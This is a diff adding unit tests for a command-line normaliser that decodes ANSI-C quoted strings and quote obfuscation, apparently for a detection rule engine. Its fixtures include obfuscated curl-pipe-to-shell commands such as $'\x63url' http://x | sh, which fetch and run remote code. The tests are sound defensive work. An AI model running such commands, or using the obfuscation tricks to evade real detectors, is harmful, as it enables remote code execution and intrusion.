@@ -10,6 +10,19 @@ describe("command_line_unquoted", () => {
   test("drops quotes and a backslash before a word character, nothing else", () => {
     expect(unquote(`c"u"rl 'cu'rl c\\url a\\ b x\\.y "a|b"`)).toBe("curl curl curl a\\ b x\\.y a|b");
   });
+  test("ANSI-C $'…' strings are decoded, $\"…\" reads as \"…\", whitespace runs collapse", () => {
+    expect(unquote(`$'\\x63url' $'\\143url' $'\\u0063url' $'c\\x75rl' $'\\U00000063url'`)).toBe("curl curl curl curl curl");
+    expect(unquote(`$'a\\tb\\\\ \\'d' $"curl"  \t x`)).toBe("a\tb\\ d curl x");
+    expect(unquote(`$'\\x00z' $'\\q'`)).toBe("z q");
+  });
+  test("a $ closing an earlier quote does not start an ANSI-C string", () => {
+    expect(unquote(`echo 'a$' ; $'\\x63url' http://x | sh`)).toBe("echo a$ ; curl http://x | sh");
+    expect(unquote(`grep -E 'foo$' f; $'\\143url' http://x | sh`)).toBe("grep -E foo$ f; curl http://x | sh");
+    expect(unquote(`echo "$'\\x63"`)).toBe("echo $'x63");
+  });
+  test("ANSI-C spelling of curl is seen by the rule field", () => {
+    expect(item("command_line_unquoted|contains", "'curl http'", cmd(`$'\\x63url' http://x | sh`))).toBe(true);
+  });
   test("quote and escape obfuscation reads as the plain command", () => {
     for (const c of [`c"u"rl ${U}/i.sh | sh`, `c\\url ${U}/i.sh | sh`, `'cu'rl ${U}/i.sh | 'sh'`, `bash -c "curl ${U}/i.sh | sh"`]) {
       expect(item("command_line_unquoted|contains", "'curl '", cmd(c))).toBe(true);
